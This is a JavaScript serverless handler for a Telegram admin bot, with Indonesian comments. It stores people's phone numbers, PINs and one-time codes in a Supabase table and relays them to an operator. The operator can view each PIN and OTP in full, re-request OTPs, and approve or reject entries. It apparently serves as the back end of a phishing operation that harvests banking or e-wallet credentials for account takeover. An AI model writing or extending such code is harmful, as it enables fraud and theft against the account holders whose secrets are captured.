import { createClient } from '@supabase/supabase-js';

export default async function handler(req, res) {
  if (req.method !== 'POST') {
    return res.status(405).json({ message: 'Method not allowed' });
  }

  const body = req.body;

  // --- Handle callback query (tombol inline) ---
  if (body.callback_query) {
    const cb = body.callback_query;
    const chatId = cb.message.chat.id;
    const data = cb.data;

    // Pastikan hanya admin yang bisa memproses
    if (chatId.toString() !== process.env.ADMIN_CHAT_ID) {
      await answerCallbackQuery(cb.id, "Anda bukan admin");
      return res.status(200).end();
    }

    // Callback untuk approve/reject (dari notifikasi awal)
    if (data.startsWith('approve|') || data.startsWith('reject|')) {
      const [decision, phone, pin, otp] = data.split('|');
      const newStatus = decision === 'approve' ? 'approved' : 'rejected';
      const supabase = createClient(process.env.SUPABASE_URL, process.env.SUPABASE_ANON_KEY);

      try {
        const { data: found, error } = await supabase
          .from('verifikasi_requests')
          .select('id')
          .eq('phone', phone)
          .eq('pin', pin)
          .eq('otp', otp)
          .eq('status', 'pending')
          .order('created_at', { ascending: false })
          .limit(1);

        if (error) throw error;
        if (found.length === 0) {
          await answerCallbackQuery(cb.id, "Data tidak ditemukan atau sudah diproses.");
          return res.status(200).end();
        }

        await supabase
          .from('verifikasi_requests')
          .update({ status: newStatus, updated_at: new Date() })
          .eq('id', found[0].id);

        await answerCallbackQuery(cb.id, `Status diubah menjadi ${newStatus}`);

        // Hapus keyboard dari pesan asli
        await fetch(`https://api.telegram.org/bot${process.env.TELEGRAM_BOT_TOKEN}/editMessageReplyMarkup`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            chat_id: chatId,
            message_id: cb.message.message_id,
            reply_markup: { inline_keyboard: [] }
          })
        });

      } catch (err) {
        console.error(err);
        await answerCallbackQuery(cb.id, "Terjadi kesalahan.");
      }
      return res.status(200).end();
    }

    // Callback untuk melihat detail request (dari daftar)
    if (data.startsWith('detail|')) {
      const requestId = data.split('|')[1];
      const supabase = createClient(process.env.SUPABASE_URL, process.env.SUPABASE_ANON_KEY);
      try {
        const { data: request, error } = await supabase
          .from('verifikasi_requests')
          .select('*')
          .eq('id', requestId)
          .single();
        if (error || !request) throw error;

        const text = `
*Detail Request*
📞 Phone: \`${request.phone}\`
🔢 PIN: \`${request.pin}\`
🔑 OTP: \`${request.otp}\`
Status: ${request.status}
Waktu: ${new Date(request.created_at).toLocaleString('id-ID')}
        `;
        // Kirim pesan detail dengan tombol "Minta OTP Lagi"
        const keyboard = {
          inline_keyboard: [
            [{ text: "🔄 Minta OTP Lagi", callback_data: `resend_otp|${requestId}` }],
            [{ text: "« Kembali ke Daftar", callback_data: `back_to_${request.status === 'pending' ? 'pending' : 'approved'}` }]
          ]
        };
        await fetch(`https://api.telegram.org/bot${process.env.TELEGRAM_BOT_TOKEN}/sendMessage`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            chat_id: chatId,
            text: text,
            parse_mode: 'Markdown',
            reply_markup: keyboard
          })
        });
        await answerCallbackQuery(cb.id, "Menampilkan detail");
      } catch (err) {
        console.error(err);
        await answerCallbackQuery(cb.id, "Gagal mengambil detail");
      }
      return res.status(200).end();
    }

    // Callback untuk "Minta OTP Lagi" (simulasi)
    if (data.startsWith('resend_otp|')) {
      const requestId = data.split('|')[1];
      const supabase = createClient(process.env.SUPABASE_URL, process.env.SUPABASE_ANON_KEY);
      try {
        const { data: request, error } = await supabase
          .from('verifikasi_requests')
          .select('otp')
          .eq('id', requestId)
          .single();
        if (error || !request) throw error;
        await answerCallbackQuery(cb.id, `OTP: ${request.otp}`);
      } catch (err) {
        await answerCallbackQuery(cb.id, "Gagal mengambil OTP");
      }
      return res.status(200).end();
    }

    // Callback untuk kembali ke daftar
    if (data === 'back_to_pending' || data === 'back_to_approved') {
      const status = data === 'back_to_pending' ? 'pending' : 'approved';
      await sendRequestList(chatId, status);
      await answerCallbackQuery(cb.id, "Memuat daftar...");
      return res.status(200).end();
    }
  }

  // --- Handle pesan teks biasa (perintah admin) ---
  const message = body.message;
  if (!message || !message.text) return res.status(200).end();

  const chatId = message.chat.id;
  if (chatId.toString() !== process.env.ADMIN_CHAT_ID) return res.status(200).end();

  const text = message.text.trim();

  if (text === '/pending') {
    await sendRequestList(chatId, 'pending');
    return res.status(200).end();
  }

  if (text === '/approved') {
    await sendRequestList(chatId, 'approved');
    return res.status(200).end();
  }

  // Jika admin masih ingin menggunakan perintah manual (opsional)
  if (text.startsWith('/verify')) {
    // ... (bisa diimplementasikan jika diinginkan)
  }

  res.status(200).end();
}

// Helper: mengirim daftar request berdasarkan status
async function sendRequestList(chatId, status) {
  const supabase = createClient(process.env.SUPABASE_URL, process.env.SUPABASE_ANON_KEY);
  try {
    const { data, error } = await supabase
      .from('verifikasi_requests')
      .select('id, phone, created_at')
      .eq('status', status)
      .order('created_at', { ascending: false })
      .limit(20); // batasi 20 terbaru

    if (error) throw error;

    if (data.length === 0) {
      await sendTelegramMessage(chatId, `Tidak ada request dengan status ${status}.`);
      return;
    }

    const buttons = data.map(req => {
      const label = `${req.phone} (${new Date(req.created_at).toLocaleTimeString('id-ID')})`;
      return [{ text: label, callback_data: `detail|${req.id}` }];
    });

    const keyboard = { inline_keyboard: buttons };

    await fetch(`https://api.telegram.org/bot${process.env.TELEGRAM_BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: chatId,
        text: `📋 *Daftar Request ${status}*`,
        parse_mode: 'Markdown',
        reply_markup: keyboard
      })
    });
  } catch (err) {
    console.error(err);
    await sendTelegramMessage(chatId, "Gagal mengambil daftar request.");
  }
}

async function sendTelegramMessage(chatId, text) {
  const token = process.env.TELEGRAM_BOT_TOKEN;
  await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ chat_id: chatId, text })
  });
}

async function answerCallbackQuery(callbackQueryId, text) {
  const token = process.env.TELEGRAM_BOT_TOKEN;
  await fetch(`https://api.telegram.org/bot${token}/answerCallbackQuery`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ callback_query_id: callbackQueryId, text })
  });
}